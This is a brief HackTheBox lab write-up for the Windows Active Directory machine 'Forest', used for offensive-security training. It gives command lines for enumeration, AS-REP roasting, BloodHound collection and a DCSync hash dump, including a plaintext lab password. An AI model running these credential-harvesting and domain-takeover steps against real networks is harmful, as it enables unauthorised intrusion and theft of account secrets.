
---
title: "HTB — Forest Writeup"
date: 2025-06-25
categories: [HackTheBox, Easy]
tags: [AS-REP Roasting, BloodHound, DCSync, Windows, AD]
---

## Summary

Forest is an Easy Windows machine focused on Active Directory enumeration and exploitation. The attack path involves AS-REP Roasting to obtain credentials, followed by BloodHound enumeration to discover a DCSync privilege escalation path.

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oA forest 10.10.10.161
```

### SMB Enumeration
```bash
enum4linux -a 10.10.10.161
```

## Foothold

### AS-REP Roasting
```bash
GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
```

## Privilege Escalation

### BloodHound Enumeration
```bash
SharpHound.exe -c All
```

### DCSync Attack
```bash
secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
```

## Lessons Learned

- Always enumerate SMB null sessions on Windows machines
- AS-REP Roasting works when pre-authentication is disabled
- BloodHound reveals hidden ACL paths to Domain Admin
